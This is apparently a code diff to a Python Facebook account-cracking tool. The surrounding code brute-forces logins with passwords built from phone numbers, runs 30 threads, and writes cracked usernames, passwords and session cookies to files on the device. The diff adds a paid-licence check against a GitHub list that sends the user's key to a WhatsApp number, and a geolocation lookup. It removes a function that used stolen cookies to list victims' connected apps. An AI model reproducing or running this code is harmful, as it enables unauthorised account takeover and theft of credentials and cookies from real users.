@@ -22,6 +22,15 @@ class jalan:
             sys.stdout.flush()
             time.sleep(0.040)
 ###----------[ GLOBAL NAMA ]----------###
+def get_current_city():
+    try:
+        response = requests.get('https://ipinfo.io/json')
+        data = response.json()
+        return data['city']
+    except Exception as e:
+        print("Error fetching current city:", e)
+        return None
+current_city = get_current_city()
 
 id,id2,uid = [],[],[]
 tokenefb = []
@@ -368,6 +377,39 @@ c3=('2n8sj2p4')
 cu=('Ki')
 cuu=('ngcy')
 cuuu=('ber')
+class Process:
+    def __init__(self):
+        self.cc=[]
+        self.key="ATOM-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
+        #self.key=""
+        self.clear()
+        r = self.Gex('https://github.com/DESTROYED-ATOM/ATOM/blob/main/Approve.txt')
+        if self.key in r:
+            self.enroll()
+        else:
+            self.clear()
+            print("\x1b[38;1;97m               NOTES   ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m AFTER PAYMENT ACCESS TOOLS ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +self.key)
+            input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
+            time.sleep(3.5)
+            tks = 'TOKEN KEY =%20%20:%20'+self.key
+            os.system('am start https://wa.me/+918389066877?text=' + tks)
+            exit()
+    def clear(self):os.system('clear');____banner____()
+    def Gex(self,x):
+        buffer = BytesIO()
+        c = pycurl.Curl()
+        c.setopt(c.URL, x)
+        c.setopt(c.WRITEDATA, buffer)
+        try:c.perform()
+        except:exit(' Network Issue')
+        c.close()
+        return buffer.getvalue().decode('utf-8')
+    def enroll(self):
+        mainx()
 
 def mainx():
     clear();banner()
@@ -726,7 +768,7 @@ def NUM():
   with tred(max_workers=30) as king_xd:
     os.system('clear')
     tl = str(len(user))
-    banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
+    banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}YOUR CITY{RED}    : {H}{current_city}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       idf = kode+guru
       pwv = [idf[:6],idf[:8],idf,]
@@ -1102,14 +1144,12 @@ def m4(idf,pwv):
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            cek_apk(kuki)
             open('/sdcard/ATOM-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            cek_apk(kuki)
             open('/sdcard/ATOM-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
@@ -1179,14 +1219,12 @@ def m5(idf,pwv):
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            cek_apk(kuki)
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            cek_apk(kuki)
             open('/sdcard/ATOM-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
@@ -1257,14 +1295,12 @@ def m6(idf,pwv):
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            cek_apk(kuki)
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            cek_apk(kuki)
             open('/sdcard/ATOM-M6-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
@@ -1284,26 +1320,7 @@ def m6(idf,pwv):
   pass 
 
 # INDIA X PAKISTAN -- MAIN DEF #
-def cek_apk(kuki):
-	session = requests.Session()
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
-	except AttributeError:
-		print ("\r    %s\033[0m cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
-	except AttributeError:
-		print ("\r    %s \033[0mcookie invalid"%(M))
+
 if __name__=='__main__':
   try:os.mkdir('KING-SUMON')
   except:pass
@@ -1312,5 +1329,5 @@ if __name__=='__main__':
 #  b2()
 #  mainx() 
 
-mainx()
+Process()
 
